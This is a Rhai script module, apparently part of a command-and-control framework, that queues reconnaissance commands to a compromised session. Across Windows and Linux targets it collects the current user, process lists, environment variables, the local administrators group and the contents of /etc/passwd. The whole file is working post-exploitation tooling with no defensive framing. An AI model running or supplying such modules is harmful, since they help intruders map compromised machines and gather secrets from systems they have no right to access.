// modules/recon2.rhai
// Extended recon: process list, environment, local users.
fn run(session_id) {
    print("Module 'Recon2' started for Session: " + session_id);

    send_c2_command(session_id, "shell whoami");

    // Process list
    send_c2_command(session_id, "shell tasklist");                      // Windows
    send_c2_command(session_id, "shell ps aux --no-headers");           // Linux

    // Environment
    send_c2_command(session_id, "shell set");                           // Windows
    send_c2_command(session_id, "shell env");                           // Linux

    // Local accounts
    send_c2_command(session_id, "shell net localgroup administrators"); // Windows
    send_c2_command(session_id, "shell cat /etc/passwd");               // Linux

    return "Recon2 commands queued for Session " + session_id;
}
